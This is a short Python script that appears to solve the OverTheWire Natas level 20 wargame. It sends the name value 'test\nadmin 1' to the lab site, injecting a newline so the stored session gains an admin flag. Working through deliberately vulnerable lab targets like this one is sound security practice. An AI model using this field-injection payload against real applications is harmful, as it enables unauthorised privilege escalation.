import requests
import re

username = 'natas20'
passwd = '<contraseñaNatas20>'

url = 'http://natas20.natas.labs.overthewire.org/index.php?debug'

session = requests.Session()

response = session.get(url, auth= (username, passwd))
print(response.text) 
print("="*80)

response = session.post(url, data = {"name": "test\nadmin 1"}, auth = (username, passwd))
print(response.text) 
print("="*80)

response = session.get(url, auth= (username, passwd))
print(response.text) 
print("="*80)